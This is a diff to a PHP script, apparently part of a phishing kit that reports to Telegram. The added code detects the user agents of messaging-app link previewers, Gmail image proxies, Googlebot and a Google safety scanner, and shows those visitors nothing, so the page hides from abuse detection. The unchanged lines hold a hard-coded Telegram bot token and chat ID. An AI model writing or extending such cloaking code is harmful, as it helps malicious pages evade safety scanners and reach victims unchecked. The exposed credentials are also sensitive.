@@ -2,6 +2,21 @@
 // ******************************************
 // CONFIGURATION: PASTE YOUR REAL DETAILS HERE
 // ******************************************
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+
+if (strpos($userAgent, 'TelegramBot') !== false ||      // Telegram
+    strpos($userAgent, 'WhatsApp') !== false ||         // WhatsApp
+    strpos($userAgent, 'Instagram') !== false ||        // Instagram
+    strpos($userAgent, 'facebookexternalhit') !== false || // FB/Messenger
+    strpos($userAgent, 'Facebot') !== false ||          // FB Crawler
+    strpos($userAgent, 'GoogleImageProxy') !== false || // Gmail Previews
+    strpos($userAgent, 'Googlebot') !== false ||        // Google Search
+    strpos($userAgent, 'Google-Safety') !== false ||    // <--- NEW: Safety Scanner
+    strpos($userAgent, 'Mediapartners-Google') !== false) { // AdSense Bot
+    
+    exit(); // Stop immediately. Show them nothing.
+}
+
 $botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386... token here
 $chatId = "-1003598938463";     // Paste your -100... ID here
 // ******************************************
